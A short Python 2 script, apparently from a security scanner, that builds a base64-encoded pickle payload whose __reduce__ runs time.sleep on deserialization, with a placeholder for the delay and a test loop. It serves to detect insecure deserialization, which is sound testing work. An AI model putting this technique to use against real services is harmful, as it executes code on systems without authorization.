import cPickle
import time
import base64


class DelayUsingSleep(object):
    def __reduce__(self):
        return time.sleep, (123456,)


REPLACE_TOKEN = '__DELAY_HERE__'

dump = cPickle.dumps(DelayUsingSleep())
dump_with_replace = dump.replace('123456', REPLACE_TOKEN)
payload = base64.b64encode(dump_with_replace)

print repr(dump_with_replace)

print('Save this to pickle.json: %s' % payload)

# Just for testing that everything works as expected
for i in [1, 3, 5, 11]:
    print('Sleeping for %s seconds' % i)
    dump_i = dump_with_replace.replace(REPLACE_TOKEN, str(i))
    cPickle.loads(dump_i)

